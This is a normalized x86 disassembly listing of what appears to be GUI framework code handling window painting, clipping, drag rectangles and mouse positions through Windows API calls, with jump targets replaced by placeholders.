mov edx 0xb00e
mov eax ebx
call sub_43efc4
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41d5e0
mov [ ebx + 0x84 ] eax
sub_43e030
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43e020
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_43afc8
mov eax esi
call sub_43afc8
jmp r-xdata
sub_43e068
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_413e40
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413cd4
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_413e60
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43e240
mov eax ebx
call sub_45526c
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_40349c
sub_43e0e8
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_43e068
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_43e068
jmp r-xdata
sub_43e10c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_43e1a2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e1a9
lea eax [ ebp - 0xc ]
call sub_404074
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
sub_43e1b4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_413e40
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_413de4
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43d798
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e240
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4448fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43d798
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4445f8
push eax
call InvalidateRect
push ebp
call sub_43e1b4
pop ecx
test al al
je r-xdata
mov al 0x1
sub_43e2dc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_455244
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_43efc4
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_40349c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43e340
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4448fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4445f8
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_43e419
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_442404
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4445f8
push eax
call ReleaseDC
retn
sub_43e4b8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax edi
call sub_43eff8
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43d93c
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406b20
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_43efc4
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_43c148
sub_43e58c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_43e5c8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_43e614
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_43e640
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_43dd9c
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_43dd88
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402a78
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402a78
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_4445f8
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_43e724
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_43e770
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_40349c
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_40349c
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_43e834
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_43e880
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_43e8cc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43e9e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41dc20
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e9ee
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_43ea20
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_43d93c
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403450
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_40349c
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_40349c
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_40349c
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_40349c
jmp r-xdata
sub_43eb10
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412988
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_43eff8
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_43dd88
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_43dd9c
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_4129d8
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43ecf0
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_43d910
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_40349c
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_4445f8
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43b50c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43ecdb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_4445f8
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_4445f8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_40349c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43d798
test esi esi
je r-xdata
sub_43ecf0
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_40349c
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_43fb74
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40349c
mov eax esi
call sub_43d840
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_43d7fc
mov ecx eax
xor edx edx
xor eax eax
call sub_4129b0
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40349c
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_43ed94
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_43edc4
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_43ee30
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_43eef0
sub_43ee60
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_43ee90
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_43d93c
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43eebc
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_43eef0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_43efc4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43eff8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_43f090
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_455244
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
